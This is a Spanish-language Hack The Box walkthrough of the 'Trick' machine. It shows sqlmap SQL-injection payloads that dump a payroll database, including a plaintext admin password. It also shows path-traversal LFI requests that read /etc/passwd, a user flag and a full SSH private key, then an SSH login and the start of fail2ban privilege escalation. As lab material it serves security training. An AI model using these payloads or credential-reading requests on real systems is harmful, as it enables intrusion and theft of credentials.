13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 π ~/htb/trick ❯ ../streamio/sqlmap/sqlmap.py -u \u0026#34;http://preprod-payroll.trick.htb/manage_user.php?id=1\u0026#34; --dbs ___ __H__ ___ ___[\u0026#34;]_____ ___ ___ {1.6.6.12#dev} |_ -| . [.] | .\u0026#39;| . | |___|_ [)]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 23:33:21 /2022-06-29/ [23:33:21] [INFO] testing connection to the target URL [.. snip ..] sqlmap identified the following injection point(s) with a total of 86 HTTP(s) requests: --- Parameter: id (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: id=1 AND 1127=1127 Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: id=1 AND (SELECT 9338 FROM (SELECT(SLEEP(5)))EMCU) Type: UNION query Title: Generic UNION query (NULL) - 8 columns Payload: id=-1119 UNION ALL SELECT NULL,NULL,CONCAT(0x71786a7671,0x4546476c546a4379635964587a6e7848434d475a75764d536b64566556674e524453767a5455676e,0x716a787a71),NULL,NULL,NULL,NULL,NULL-- - --- [23:33:50] [INFO] the back-end DBMS is MySQL web application technology: Nginx 1.14.2 back-end DBMS: MySQL \u0026gt;= 5.0.12 (MariaDB fork) [23:33:50] [INFO] fetching database names [23:33:51] [INFO] retrieved: \u0026#39;information_schema\u0026#39; [23:33:51] [INFO] retrieved: \u0026#39;payroll_db\u0026#39; available databases [2]: [*] information_schema [*] payroll_db [.. snip ..] Vemos que existe solo un usuario dentro de la base de datos, y no vemos algun otra tabla con información sensible.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 Database: payroll_db [11 tables] +---------------------+ | position | | allowances | | attendance | | deductions | | department | | employee | | employee_allowances | | employee_deductions | | payroll | | payroll_items | | users | +---------------------+ Database: payroll_db Table: users [8 columns] +-----------+--------------+ | Column | Type | +-----------+--------------+ | address | text | | contact | text | | doctor_id | int(30) | | id | int(30) | | name | varchar(200) | | password | varchar(200) | | type | tinyint(1) | | username | varchar(100) | +-----------+--------------+ Database: payroll_db Table: users [1 entry] +---------------+-----------------------+------------+ | name | password | username | +---------------+-----------------------+------------+ | Administrator | SuperGucciRainbowCake | Enemigosss | +---------------+-----------------------+------------+ Tras enumerar los privilegios del usuario se muestra unicamente FILE, por lo que podríamos acceder a archivos de la máquina.\n1 2 3 4 [23:37:10] [INFO] fetching database users privileges database management system users privileges: [*] \u0026#39;remo\u0026#39;@\u0026#39;localhost\u0026#39; [1]: privilege: FILE Utilizando --file-read=FILE logramos acceder al archivo /etc/hosts, no vemos los subdominos o dominio que encontramos con dig.\n1 2 3 4 π ~/htb/trick ❯ cat /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_hosts 127.0.0.1 localhost 127.0.1.1 trick π ~/htb/trick ❯ El sitio esta corriendo en un nginx, obtuvimos el archivo sites-available/default, se muestran (server_name) el dominio y subdominio que encontramos, además encontramos uno nuevo: preprod-marketing.trick.htb.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 # /etc/nginx/sites-available/default π ~/htb/trick ❯ cat /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-available_default server { listen 80 default_server; listen [::]:80 default_server; server_name trick.htb; root /var/www/html; index index.html index.htm index.nginx-debian.html; server_name _; location / { try_files $uri $uri/ =404; } location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.3-fpm.sock; } } server { listen 80; listen [::]:80; server_name preprod-marketing.trick.htb; root /var/www/market; index index.php; location / { try_files $uri $uri/ =404; } location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock; } } server { listen 80; listen [::]:80; server_name preprod-payroll.trick.htb; root /var/www/payroll; index index.php; location / { try_files $uri $uri/ =404; } location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.3-fpm.sock; } } π ~/htb/trick ❯ Preprod-Marketing - LFI Encontramos un sitio web \u0026ldquo;estatico\u0026rdquo;.\nFeroxbuster unicamente muestra paginas html, los recursos y el index.php.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 π ~/htb/trick ❯ feroxbuster -u http://preprod-marketing.trick.htb/ -w $MD --depth 1 -x php,html ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.5.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://preprod-marketing.trick.htb/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.5.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [php, html] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 1 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 301 GET 7l 12w 185c http://preprod-marketing.trick.htb/img =\u0026gt; http://preprod-marketing.trick.htb/img/ 200 GET 178l 631w 0c http://preprod-marketing.trick.htb/index.php 200 GET 144l 417w 7677c http://preprod-marketing.trick.htb/contact.html 200 GET 178l 631w 9660c http://preprod-marketing.trick.htb/home.html 200 GET 192l 724w 10757c http://preprod-marketing.trick.htb/services.html 200 GET 242l 799w 13272c http://preprod-marketing.trick.htb/about.html 301 GET 7l 12w 185c http://preprod-marketing.trick.htb/css =\u0026gt; http://preprod-marketing.trick.htb/css/ 301 GET 7l 12w 185c http://preprod-marketing.trick.htb/js =\u0026gt; http://preprod-marketing.trick.htb/js/ Tras navegar por las paginas vemos que al igula que en Payroll pasa como valor el nombre de la pagina con la extensión, por lo que nuevamente podría tratarse de una vulnerabilidad LFI.\nObtuvimos el contenido de /etc/passwd tras intenter distintos \u0026ldquo;payloads\u0026rdquo;, observamos al usuario michael.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 π ~/htb/trick ❯ curl -s \u0026#34;http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//etc/passwd\u0026#34; root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin saned:x:112:121::/var/lib/saned:/usr/sbin/nologin colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false sshd:x:118:65534::/run/sshd:/usr/sbin/nologin postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin bind:x:120:128::/var/cache/bind:/usr/sbin/nologin michael:x:1001:1001::/home/michael:/bin/bash π ~/htb/trick ❯ User - Michael Tras enumerar el directorio de este usuario encontramos la flag user.txt.\n1 2 3 π ~/htb/trick ❯ curl -s \u0026#34;http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/user.txt\u0026#34; 5b5ad3d88d0521fa5e49bcd1150731eb π ~/htb/trick ❯ También obtuvimos su clave privada de SSH.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 π ~/htb/trick ❯ curl -s \u0026#34;http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa\u0026#34; -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+ 4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/ Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4 1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0 +93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6 IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/ KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0 fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS 3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+ IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ== -----END OPENSSH PRIVATE KEY----- π ~/htb/trick ❯ curl -s \u0026#34;http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa\u0026#34; \u0026gt; michael_id_rsa π ~/htb/trick ❯ chmod 400 michael_id_rsa Con ello lograoms acceder por SSH.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 π ~/htb/trick ❯ ssh -i michael_id_rsa michael@trick.htb Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Thu Jun 30 05:23:53 2022 from 10.10.14.33 -bash-5.0$ whoami; pwd michael /home/michael -bash-5.0$ ls Desktop Documents Downloads Music Pictures\tPublic\tTemplates user.txt Videos -bash-5.0$ cat user.txt 5b5ad3d88d0521fa5e49bcd1150731eb -bash-5.0$ Privesc Tras obtener una shell en la máquina ejecutamos sudo -l lo cual nos mostró el servicio fail2ban.\n1 2 3 4 5 6 7 8 9 michael@trick:~$ sudo -l Matching Defaults entries for michael on trick: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User michael may run the following commands on trick: (root) NOPASSWD: /etc/init.d/fail2ban restart michael@trick:~$ ls -lah /etc/init.d/fail2ban -rwxr-xr-x 1 root root 6.6K Sep 23 2018 /etc/init.d/fail2ban michael@trick:~$ Tras realizar una pequeña investigación sobre fail2ban encontramos un post que habla sobre el funcionamiento en linux y menciona diferentes archivos. El archivo fail2ban.conf contiene información sobre el pid, log, socket, etc., jail.local contiene las \u0026ldquo;politicas\u0026rdquo; y donde se configura el filtro a utilizar en X servicio, puerto, etc., como ejemplo SSH donde menciona el filtro sshd este filtro se encuentra bajo el directorio filter.d/, basicamente realiza una busqueda de caracteres o strings dentro de los logs del servicio, de encontrarse con uno de estos ejecuta un action, este se encuentra bajo el directorio action.d/ en este caso iptables-multiport.conf, este ultimo ejecuta distintos comandos segun el action, en este caso ejecuta el comando iptables.\nCon esto sabemos que es posible ejecutar comandos utilizando actions, primero verificamos cual es la configuración de fail2ban con fail2ban-client.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 [.. snip ..] Options: -c \u0026lt;DIR\u0026gt; configuration directory -s \u0026lt;FILE\u0026gt; socket path -p \u0026lt;FILE\u0026gt; pidfile path --loglevel \u0026lt;LEVEL\u0026gt; logging level --logtarget \u0026lt;TARGET\u0026gt; logging target, use file-name or stdout, stderr, syslog or sysout. --syslogsocket auto|\u0026lt;FILE\u0026gt; -d dump configuration. For debugging --dp, --dump-pretty dump the configuration using more human readable representation -t, --test test configuration (can be also specified with start parameters) -i interactive mode -v increase verbosity -q decrease verbosity -x force execution of the server (remove socket file) -b start server in background (default) -f start server in foreground --async start server in async mode (for internal usage only, don\u0026#39;t read configuration) --timeout timeout to wait for the server (for internal usage only, don\u0026#39;t read configuration) --str2sec \u0026lt;STRING\u0026gt; convert time abbreviation format to seconds -h, --help display this help message -V, --version print the version [.. snip ..] Con la flag -d observamos la configuración, en este caso vemos que el filtro ssh está activo, se observa el action (addaction) iptables-multiport.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 michael@trick:/etc/fail2ban$ fail2ban-client -d [\u0026#39;set\u0026#39;, \u0026#39;syslogsocket\u0026#39;, \u0026#39;auto\u0026#39;] [\u0026#39;set\u0026#39;, \u0026#39;loglevel\u0026#39;, \u0026#39;INFO\u0026#39;] [\u0026#39;set\u0026#39;, \u0026#39;logtarget\u0026#39;, \u0026#39;/var/log/fail2ban.log\u0026#39;] [\u0026#39;set\u0026#39;, \u0026#39;dbfile\u0026#39;, \u0026#39;/var/lib/fail2ban/fail2ban.sqlite3\u0026#39;] [\u0026#39;set\u0026#39;, \u0026#39;dbpurgeage\u0026#39;, \u0026#39;60\u0026#39;] [\u0026#39;add\u0026#39;, \u0026#39;sshd\u0026#39;, \u0026#39;auto\u0026#39;] [\u0026#39;set\u0026#39;, \u0026#39;sshd\u0026#39;, \u0026#39;maxlines\u0026#39;, 1] [\u0026#39;set\u0026#39;, \u0026#39;sshd\u0026#39;, \u0026#39;prefregex\u0026#39;, \u0026#39;^\u0026lt;F-MLFID\u0026gt;(?:\\\\[\\\\])?\\\\s*(?:\u0026lt;[^.]+\\\\.[^.]+\u0026gt;\\\\s+)?(?:\\\\S+\\\\s+)?(?:kernel: \\\\[ *\\\\d+\\\\.\\\\d+\\\\]\\\\s+)?(?:@vserver_\\\\S+\\\\s+)?(?:(?:(?:\\\\[\\\\d+\\\\])?:\\\\s+[\\\\[\\\\(]?sshd(?:\\\\(\\\\S+\\\\))?[\\\\]\\\\)]?:?|[\\\\[\\\\(]?sshd(?:\\\\(\\\\S+\\\\))?[\\\\]\\\\)]?:?(?:\\\\[\\\\d+\\\\])?:?)\\\\s+)?(?:\\\\[ID \\\\d+ \\\\S+\\\\]\\\\s+)?\u0026lt;/F-MLFID\u0026gt;(?:(?:error|fatal): (?:PAM: )?)?\u0026lt;F-CONTENT\u0026gt;.+\u0026lt;/F-CONTENT\u0026gt;$\u0026#39;] [\u0026#39;multi-set\u0026#39;, \u0026#39;sshd\u0026#39;, \u0026#39;addfailregex\u0026#39;, [\u0026#39;^[aA]uthentication (?:failure|error|failed) for \u0026lt;F-USER\u0026gt;.*\u0026lt;/F-USER\u0026gt; from \u0026lt;HOST\u0026gt;( via \\\\S+)?\\\\s*(?: \\\\[preauth\\\\])?\\\\s*$\u0026#39;, \u0026#39;^User not known to the underlying authentication module for \u0026lt;F-USER\u0026gt;.*\u0026lt;/F-USER\u0026gt; from \u0026lt;HOST\u0026gt;\\\\s*(?: \\\\[preauth\\\\])?\\\\s*$\u0026#39;, \u0026#39;^Failed \\\\S+ for invalid user \u0026lt;F-USER\u0026gt;(?P\u0026lt;cond_user\u0026gt;\\\\S+)|(?:(?! from ).)*?\u0026lt;/F-USER\u0026gt; from \u0026lt;HOST\u0026gt;(?: port \\\\d+)?(?: on \\\\S+(?: port \\\\d+)?)?(?: ssh\\\\d*)?(?(cond_user): |(?:(?:(?! from ).)*)$)\u0026#39;, \u0026#39;^Failed \\\\b(?!publickey)\\\\S+ for (?P\u0026lt;cond_inv\u0026gt;invalid user )?\u0026lt;F-USER\u0026gt;(?P\u0026lt;cond_user\u0026gt;\\\\S+)|(?(cond_inv)(?:(?! from ).)*?|[^:]+)\u0026lt;/F-USER\u0026gt; from \u0026lt;HOST\u0026gt;(?: port \\\\d+)?(?: on \\\\S+(?: port \\\\d+)?)?(?: ssh\\\\d*)?(?(cond_user): |(?:(?:(?! from ).)*)$)\u0026#39;, \u0026#39;^\u0026lt;F-USER\u0026gt;ROOT\u0026lt;/F-USER\u0026gt; LOGIN REFUSED.* FROM \u0026lt;HOST\u0026gt;\\\\s*(?: \\\\[preauth\\\\])?\\\\s*$\u0026#39;, \u0026#39;^[iI](?:llegal|nvalid) user \u0026lt;F-USER\u0026gt;.*?\u0026lt;/F-USER\u0026gt; from \u0026lt;HOST\u0026gt;(?: port \\\\d+)?(?: on \\\\S+(?: port \\\\d+)?)?\\\\s*$\u0026#39;, \u0026#39;^User \u0026lt;F-USER\u0026gt;.+\u0026lt;/F-USER\u0026gt; from \u0026lt;HOST\u0026gt; not allowed because not listed in AllowUsers\\\\s*(?: \\\\[preauth\\\\])?\\\\s*$\u0026#39;, \u0026#39;^User \u0026lt;F-USER\u0026gt;.+\u0026lt;/F-USER\u0026gt; from \u0026lt;HOST\u0026gt; not allowed because listed in DenyUsers\\\\s*(?: \\\\[preauth\\\\])?\\\\s*$\u0026#39;, \u0026#39;^User \u0026lt;F-USER\u0026gt;.+\u0026lt;/F-USER\u0026gt; from \u0026lt;HOST\u0026gt; not allowed because not in any group\\\\s*(?: \\\\[preauth\\\\])?\\\\s*$\u0026#39;, \u0026#39;^refused connect from \\\\S+ \\\\(\u0026lt;HOST\u0026gt;\\\\)\\\\s*(?: \\\\[preauth\\\\])?\\\\s*$\u0026#39;, \u0026#39;^Received \u0026lt;F-MLFFORGET\u0026gt;disconnect\u0026lt;/F-MLFFORGET\u0026gt; from \u0026lt;HOST\u0026gt;(?: port \\\\d+)?(?: on \\\\S+(?: port \\\\d+)?)?:\\\\s*3: .*: Auth fail(?: \\\\[preauth\\\\])?\\\\s*$\u0026#39;, \u0026#39;^User \u0026lt;F-USER\u0026gt;.+\u0026lt;/F-USER\u0026gt; from \u0026lt;HOST\u0026gt; not allowed because a group is listed in DenyGroups\\\\s*(?: \\\\[preauth\\\\])?\\\\s*$\u0026#39;, \u0026#34;^User \u0026lt;F-USER\u0026gt;.+\u0026lt;/F-USER\u0026gt; from \u0026lt;HOST\u0026gt; not allowed because none of user\u0026#39;s groups are listed in AllowGroups\\\\s*(?: \\\\[preauth\\\\])?\\\\s*$\u0026#34;, \u0026#39;^pam_unix\\\\(sshd:auth\\\\):\\\\s+authentication failure;\\\\s*logname=\\\\S*\\\\s*uid=\\\\d*\\\\s*euid=\\\\d*\\\\s*tty=\\\\S*\\\\s*ruser=\u0026lt;F-USER\u0026gt;\\\\S*\u0026lt;/F-USER\u0026gt;\\\\s*rhost=\u0026lt;HOST\u0026gt;\\\\s.*(?: \\\\[preauth\\\\])?\\\\s*$\u0026#39;, \u0026#39;^(error: )?maximum authentication attempts exceeded for \u0026lt;F-USER\u0026gt;.*\u0026lt;/F-USER\u0026gt; from \u0026lt;HOST\u0026gt;(?: port \\\\d+)?(?: on \\\\S+(?: port \\\\d+)?)?(?: ssh\\\\d*)?(?: \\\\[preauth\\\\])?\\\\s*$\u0026#39;, \u0026#39;^User \u0026lt;F-USER\u0026gt;.+\u0026lt;/F-USER\u0026gt; not allowed because account is locked(?: \\\\[preauth\\\\])?\\\\s*\u0026#39;, \u0026#39;^\u0026lt;F-MLFFORGET\u0026gt;Disconnecting\u0026lt;/F-MLFFORGET\u0026gt;: Too many authentication failures(?: for \u0026lt;F-USER\u0026gt;.+?\u0026lt;/F-USER\u0026gt;)?(?: \\\\[preauth\\\\])?\\\\s*\u0026#39;, \u0026#39;^\u0026lt;F-NOFAIL\u0026gt;Received \u0026lt;F-MLFFORGET\u0026gt;disconnect\u0026lt;/F-MLFFORGET\u0026gt;\u0026lt;/F-NOFAIL\u0026gt; from \u0026lt;HOST\u0026gt;: 11:\u0026#39;, \u0026#39;^\u0026lt;F-NOFAIL\u0026gt;Connection \u0026lt;F-MLFFORGET\u0026gt;closed\u0026lt;/F-MLFFORGET\u0026gt;\u0026lt;/F-NOFAIL\u0026gt; by \u0026lt;HOST\u0026gt;(?: \\\\[preauth\\\\])?\\\\s*$\u0026#39;, \u0026#39;^\u0026lt;F-MLFFORGET\u0026gt;\u0026lt;F-NOFAIL\u0026gt;Accepted publickey\u0026lt;/F-NOFAIL\u0026gt;\u0026lt;/F-MLFFORGET\u0026gt; for \\\\S+ from \u0026lt;HOST\u0026gt;(?:\\\\s|$)\u0026#39;, \u0026#39;^\u0026lt;F-NOFAIL\u0026gt;Connection from\u0026lt;/F-NOFAIL\u0026gt; \u0026lt;HOST\u0026gt;\u0026#39;]] [\u0026#39;set\u0026#39;, \u0026#39;sshd\u0026#39;, \u0026#39;datepattern\u0026#39;, \u0026#39;{^LN-BEG}\u0026#39;] [\u0026#39;set\u0026#39;, \u0026#39;sshd\u0026#39;, \u0026#39;addjournalmatch\u0026#39;, \u0026#39;_SYSTEMD_UNIT=sshd.service\u0026#39;, \u0026#39;+\u0026#39;, \u0026#39;_COMM=sshd\u0026#39;] [\u0026#39;set\u0026#39;, \u0026#39;sshd\u0026#39;, \u0026#39;addlogpath\u0026#39;, \u0026#39;/var/log/auth.log\u0026#39;, \u0026#39;head\u0026#39;] [\u0026#39;set\u0026#39;, \u0026#39;sshd\u0026#39;, \u0026#39;logencoding\u0026#39;, \u0026#39;auto\u0026#39;] [\u0026#39;set\u0026#39;, \u0026#39;sshd\u0026#39;, \u0026#39;maxretry\u0026#39;, 5] [\u0026#39;set\u0026#39;, \u0026#39;sshd\u0026#39;, \u0026#39;findtime\u0026#39;, \u0026#39;10s\u0026#39;] [\u0026#39;set\u0026#39;, \u0026#39;sshd\u0026#39;, \u0026#39;bantime\u0026#39;, \u0026#39;10s\u0026#39;] [\u0026#39;set\u0026#39;, \u0026#39;sshd\u0026#39;, \u0026#39;usedns\u0026#39;, \u0026#39;warn\u0026#39;] [\u0026#39;set\u0026#39;, \u0026#39;sshd\u0026#39;, \u0026#39;ignorecommand\u0026#39;, \u0026#39;\u0026#39;] [\u0026#39;set\u0026#39;, \u0026#39;sshd\u0026#39;, \u0026#39;addaction\u0026#39;, \u0026#39;iptables-multiport\u0026#39;] [\u0026#39;multi-set\u0026#39;, \u0026#39;sshd\u0026#39;, \u0026#39;action\u0026#39;, \u0026#39;iptables-multiport\u0026#39;, [[\u0026#39;actionstart\u0026#39;, \u0026#39;\u0026lt;iptables\u0026gt; -N f2b-sshd\\n\u0026lt;iptables\u0026gt; -A f2b-sshd -j RETURN\\n\u0026lt;iptables\u0026gt; -I INPUT -p tcp -m multiport --dports ssh -j f2b-sshd\u0026#39;], [\u0026#39;actionstop\u0026#39;, \u0026#39;\u0026lt;iptables\u0026gt; -D INPUT -p tcp -m multiport --dports ssh -j f2b-sshd\\n\u0026lt;iptables\u0026gt; -F f2b-sshd\\n\u0026lt;iptables\u0026gt; -X f2b-sshd\u0026#39;], [\u0026#39;actionflush\u0026#39;, \u0026#39;\u0026lt;iptables\u0026gt; -F f2b-sshd\u0026#39;], [\u0026#39;actioncheck\u0026#39;, \u0026#34;\u0026lt;iptables\u0026gt; -n -L INPUT | grep -q \u0026#39;f2b-sshd[ \\\\t]\u0026#39;\u0026#34;], [\u0026#39;actionban\u0026#39;, \u0026#39;\u0026lt;iptables\u0026gt; -I f2b-sshd 1 -s \u0026lt;ip\u0026gt; -j \u0026lt;blocktype\u0026gt;\u0026#39;], [\u0026#39;actionunban\u0026#39;, \u0026#39;\u0026lt;iptables\u0026gt; -D f2b-sshd -s \u0026lt;ip\u0026gt; -j \u0026lt;blocktype\u0026gt;\u0026#39;], [\u0026#39;name\u0026#39;, \u0026#39;sshd\u0026#39;], [\u0026#39;bantime\u0026#39;, \u0026#39;10s\u0026#39;], [\u0026#39;port\u0026#39;, \u0026#39;ssh\u0026#39;], [\u0026#39;protocol\u0026#39;, \u0026#39;tcp\u0026#39;], [\u0026#39;chain\u0026#39;, \u0026#39;\u0026lt;known/chain\u0026gt;\u0026#39;], [\u0026#39;actname\u0026#39;, \u0026#39;iptables-multiport\u0026#39;], [\u0026#39;blocktype\u0026#39;, \u0026#39;REJECT --reject-with icmp-port-unreachable\u0026#39;], [\u0026#39;returntype\u0026#39;, \u0026#39;RETURN\u0026#39;], [\u0026#39;lockingopt\u0026#39;, \u0026#39;-w\u0026#39;], [\u0026#39;iptables\u0026#39;, \u0026#39;iptables \u0026lt;lockingopt\u0026gt;\u0026#39;], [\u0026#39;blocktype?family=inet6\u0026#39;, \u0026#39;REJECT --reject-with icmp6-port-unreachable\u0026#39;], [\u0026#39;iptables?family=inet6\u0026#39;, \u0026#39;ip6tables \u0026lt;lockingopt\u0026gt;\u0026#39;]]] [\u0026#39;start\u0026#39;, \u0026#39;sshd\u0026#39;] michael@trick:/etc/fail2ban$ Observamos la configuración del action.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 michael@trick:/etc/fail2ban/action.d$ cat iptables-multiport.conf |grep -v \u0026#34;#\u0026#34; [INCLUDES] before = iptables-common.conf [Definition] actionstart = \u0026lt;iptables\u0026gt; -N f2b-\u0026lt;name\u0026gt; 